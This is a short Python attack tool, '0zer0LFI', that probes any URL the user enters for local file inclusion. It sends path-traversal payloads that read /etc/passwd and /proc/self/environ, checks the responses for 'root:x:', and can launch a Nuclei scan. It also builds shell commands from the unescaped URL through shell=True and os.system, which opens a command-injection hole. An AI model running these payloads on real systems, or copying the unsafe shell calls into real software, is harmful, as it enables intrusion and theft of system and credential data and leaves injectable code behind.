#!/usr/bin/python3
# 0zer0LFI - Local File Inclusion Scanner & Exploiter
# Author: AryzXploit

import os
import sys
import json
import pyfiglet
import time
import subprocess
from termcolor import colored

secret_path = os.path.expanduser('~/.0zer0LFI/')
auth_status_file = os.path.join(secret_path, 'auth_status.json')

def verify_auth():
    """Verifikasi token sebelum menjalankan tools"""
    if not os.path.exists(auth_status_file):
        print(colored("❌ Unauthorized Access! Please login through LoginPage.py.", 'red'))
        sys.exit(1)

    with open(auth_status_file, 'r') as file:
        auth_status = json.load(file)

    if 'token' not in auth_status:
        print(colored("❌ Unauthorized Access! Please login.", 'red'))
        sys.exit(1)

    user_token = input(colored("🔑 Enter your token: ", 'cyan'))
    if user_token != auth_status["token"]:
        print(colored("❌ Invalid token! Please login again.", 'red'))
        sys.exit(1)

verify_auth()
print(colored("✅ Access Granted!", 'green'))
time.sleep(2)

LFI_PAYLOADS = [
    {
        "payload": "../../../../../../etc/passwd",
        "description": "Classic LFI"
    },
    {
        "payload": "../../../../../../proc/self/environ",
        "description": "Proc Self Environ"
    }
]

def scan_lfi(url):
    print(colored(f'🔍 Scanning {url} for LFI vulnerabilities...', 'yellow'))

    for payload in LFI_PAYLOADS:
        print(colored(f"[-] Testing {payload['description']}", 'cyan'))
        command = f"curl -s '{url}?file={payload['payload']}'"

        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            if "root:x:" in result.stdout:
                print(colored(f"[✅] Vulnerable with payload: {payload['payload']}", 'green'))
            else:
                print(colored('[❌] Not Vulnerable', 'red'))
        except Exception as e:
            print(colored(f'[!] Error: {e}', 'red'))

def scan_nuclei(url):
    print(colored(f'🚀 Running Nuclei scan on {url}...', 'yellow'))
    os.system(f"nuclei -u {url}")

def main():
    while True:
        os.system('clear')
        print(colored(pyfiglet.figlet_format('0zer0LFI', font='slant'), 'red'))
        print(colored('1. Single URL Scan', 'yellow'))
        print(colored('2. Run Nuclei Scan', 'yellow'))
        print(colored('0. Exit', 'yellow'))

        choice = input(colored('\n🤖 Pilih opsi: ', 'yellow'))

        if choice == '1':
            url = input(colored('🌐 Masukkan URL target: ', 'yellow'))
            scan_lfi(url)
        elif choice == '2':
            url = input(colored('🌐 Masukkan URL target: ', 'yellow'))
            scan_nuclei(url)
        elif choice == '0':
            break

if __name__ == '__main__':
    main()
